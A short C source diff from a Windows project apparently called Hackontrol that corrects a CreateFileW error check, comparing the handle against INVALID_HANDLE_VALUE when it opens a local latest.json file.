@@ -157,7 +157,7 @@ initializeGlobal:
 #ifdef HACKONTROL_NO_DOWNLOAD_LATEST_JSON_FILE
 	handle = CreateFileW(L"D:\\GitHub Repository\\Hackontrol\\system\\latest.json", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
-	if(!handle) {
+	if(handle == INVALID_HANDLE_VALUE) {
 		KHOPANLASTERRORMESSAGE_WIN32(L"CreateFileW");
 		goto cleanupGlobal;
 	}
